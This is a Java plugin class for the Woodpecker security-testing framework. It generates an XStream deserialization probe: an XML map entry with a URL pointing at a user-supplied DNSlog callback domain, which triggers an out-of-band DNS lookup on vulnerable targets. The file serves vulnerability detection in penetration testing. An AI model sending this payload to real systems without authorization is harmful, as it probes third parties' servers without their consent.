package me.gv7.woodpecker.vuldb.payload;

import me.gv7.woodpecker.plugin.IArg;
import me.gv7.woodpecker.plugin.IArgsUsageBinder;
import me.gv7.woodpecker.plugin.IPayloadGenerator;
import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.vuldb.XStreamVulPlugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class DnslogPayloadGenerator implements IPayloadGenerator {
    @Override
    public String getPayloadTabCaption() {
        return "dnslog";
    }

    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder argsUsageBinder = XStreamVulPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = XStreamVulPlugin.pluginHelper.createArg();
        args1.setName("dnslog_domain");
        args1.setDefaultValue("test.dnslog.com");
        args1.setDescription("dnslog域名");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void generatorPayload(Map<String, Object> customArgs, IResultOutput iResultOutput) throws Throwable{
        iResultOutput.successPrintln("xstream = all version");
        String dnslogDomain = (String)customArgs.get("dnslog_domain");
        String payload1 = String.format("<map>\n" +
                "  <entry>\n" +
                "    <url>http://%s</url>\n" +
                "    <string>x</string>\n" +
                "  </entry>\n" +
                "</map>",dnslogDomain);

        iResultOutput.rawPrintln("\n" + payload1 + "\n");
    }
}
